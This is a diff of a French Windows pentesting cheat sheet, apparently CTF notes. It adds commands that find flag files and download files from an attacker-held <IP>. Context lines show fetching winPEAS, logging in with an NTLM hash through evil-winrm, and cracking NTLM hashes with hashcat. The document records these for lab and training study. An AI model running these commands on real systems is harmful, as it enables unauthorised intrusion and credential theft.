@@ -1,12 +1,28 @@
 # Windows
 
-## Outils
+## Commandes utiles
 
-* Mimikatz
-* [winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
-* [LOLBAS](https://lolbas-project.github.io)
+**Trouver un flag**
 
-## Enumerating Windows
+```powershell
+Get-ChildItem -Path C:\ -Filter "flag.txt" -Recurse -Force -ErrorAction SilentlyContinue
+```
+
+```
+dir /s /b /a C:\flag.txt
+```
+
+**Télécharger un fichier depuis HTTP**
+
+```powershell
+iwr -uri http://<IP>/fichier -Outfile fichier
+
+(New-Object Net.WebClient).DownloadFile('http://<IP>/fichier', 'fichier')
+
+curl -o fichier http://<IP>/fichier
+```
+
+## Enumération
 
 ### Enumération manuelle
 
@@ -192,7 +208,8 @@ Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object 
 
 ### Enumération automatique
 
-#### winPEAS
+**winPEAS**
+https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
 
 Peut être bloqué par l'AV. Alternatives : Seatbelt, JAWS. Ne remplace pas l'énumération manuelle (peut rater des fichiers, mal identifier l'OS, etc.).
 
@@ -223,7 +240,8 @@ iwr -uri http://<ip>/winPEASx64.exe -Outfile winPEAS.exe
 .\winpeas.exe | Tee-Object -FilePath output.txt
 ```
 
-#### Seatbelt
+**Seatbelt**
+https://github.com/GhostPack/Seatbelt.git
 
 Compiler sur une machine Windows avec VS Build Tools, transférer le binaire sur la cible.
 
@@ -702,3 +720,6 @@ evil-winrm -i <IP> -u administrator -H NTLMhash
 ```bash
 hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
+
+### LOLBAS
+[LOLBAS](https://lolbas-project.github.io)
